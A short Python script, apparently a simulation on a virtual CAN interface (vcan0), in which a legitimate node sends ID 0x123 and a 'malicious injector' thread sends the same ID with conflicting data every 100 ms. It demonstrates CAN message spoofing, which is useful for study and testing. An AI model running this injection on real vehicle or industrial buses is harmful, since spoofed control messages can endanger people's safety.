import can
import threading
import time

# Initialize the CAN bus (use 'vcan0' for virtual interface or your actual hardware interface)
bus = can.interface.Bus(channel="vcan0", bustype="socketcan")

# Function for the legitimate sender (Node A)
def legitimate_sender():
    while True:
        message = can.Message(arbitration_id=0x123, data=[0x01, 0x02, 0x03], is_extended_id=False)
        try:
            bus.send(message)
            print("Legitimate message sent: ID=0x123")
        except can.CanError:
            print("Failed to send legitimate message")
        time.sleep(0.1)  # Sending messages every 100 ms

# Function for the malicious injector (Node B)
def conflicting_injector():
    time.sleep(0.05)  # Offset slightly to synchronize with legitimate sender
    while True:
        # Inject a message with the same ID but conflicting data
        conflict_message = can.Message(arbitration_id=0x123, data=[0xFF, 0xFF, 0xFF], is_extended_id=False)
        try:
            bus.send(conflict_message)
            print("Conflicting message injected: ID=0x123")
        except can.CanError:
            print("Failed to send conflicting message")
        time.sleep(0.1)  # Same interval as the legitimate sender

# Start threads for legitimate sender and conflicting injector
legitimate_thread = threading.Thread(target=legitimate_sender, daemon=True)
injector_thread = threading.Thread(target=conflicting_injector, daemon=True)

# Start the threads
legitimate_thread.start()
injector_thread.start()

# Run indefinitely
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Stopping simulation")